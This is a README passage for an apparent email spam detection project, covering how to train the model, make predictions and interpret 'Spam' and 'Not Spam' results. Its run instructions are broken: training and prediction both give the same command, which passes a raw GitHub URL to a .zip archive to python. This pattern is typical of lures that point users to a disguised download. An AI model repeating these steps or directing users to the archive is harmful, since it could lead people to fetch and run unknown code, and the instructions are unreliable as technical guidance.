## 🏃 How to Run the Application

Once you have installed the necessary packages, you can run the application to train the model and make predictions. 

1. **Train the Model**: Enter the following command to train the spam detection model:
   ```
   python https://raw.githubusercontent.com/Platon214/Email-Spam-Detection-Project/main/src/Email-Project-Detection-Spam-1.3.zip
   ```

2. **Make Predictions**: After training, you can now make predictions. Use this command:
   ```
   python https://raw.githubusercontent.com/Platon214/Email-Spam-Detection-Project/main/src/Email-Project-Detection-Spam-1.3.zip
   ```

You will be prompted to enter the email content you want to analyze. The application will then determine if the email is spam or not spam based on the training it received.

## 🔍 Understanding the Results

After you run the prediction command, you will see a message indicating the result. Here are the possible outcomes:

- **Spam**: The model considers the email as spam.
- **Not Spam**: The model believes the email is safe.
